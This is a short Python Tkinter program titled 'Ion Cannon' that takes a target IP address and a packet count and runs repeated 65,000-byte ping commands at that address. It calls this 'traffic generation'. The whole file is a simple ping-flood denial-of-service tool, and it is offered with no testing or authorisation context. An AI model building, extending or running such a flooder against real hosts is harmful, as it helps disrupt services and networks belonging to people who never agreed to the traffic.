import tkinter as tk
import os
from tkinter import messagebox
import subprocess

def generate_traffic():
    target_ip = ip_entry.get()
    packet_count = packet_entry.get()

    if not target_ip or not packet_count.isdigit():
        messagebox.showerror("Input Error", "Please enter a valid IP and packet count.")
        return

    packet_count = int(packet_count)

    # Simple confirmation message
    messagebox.showinfo("Traffic Generation", f"Sending {packet_count} packets to {target_ip}.")

    try:
        for i in range(packet_count):
            # Using subprocess to call the ping command (1 packet per iteration)
            subprocess.run(['ping', '-c', '1', '-s', '65000', target_ip], stdout=subprocess.DEVNULL)
        messagebox.showinfo("Success", "Traffic generation completed.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

# Tkinter GUI setup
root = tk.Tk()
root.title("Rev 1.0 Ion Cannon @Flamesworks Software [20XX]")

# Target IP Label and Entry
tk.Label(root, text="Target IP:").grid(row=0, column=0, padx=10, pady=10)
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1, padx=10, pady=10)

# Packet Count Label and Entry
tk.Label(root, text="Number of Packets:").grid(row=1, column=0, padx=10, pady=10)
packet_entry = tk.Entry(root)
packet_entry.grid(row=1, column=1, padx=10, pady=10)

# Generate Traffic Button
generate_button = tk.Button(root, text="Generate Traffic", command=generate_traffic)
generate_button.grid(row=2, columnspan=2, pady=20)

# Run the Tkinter main loop
root.mainloop()
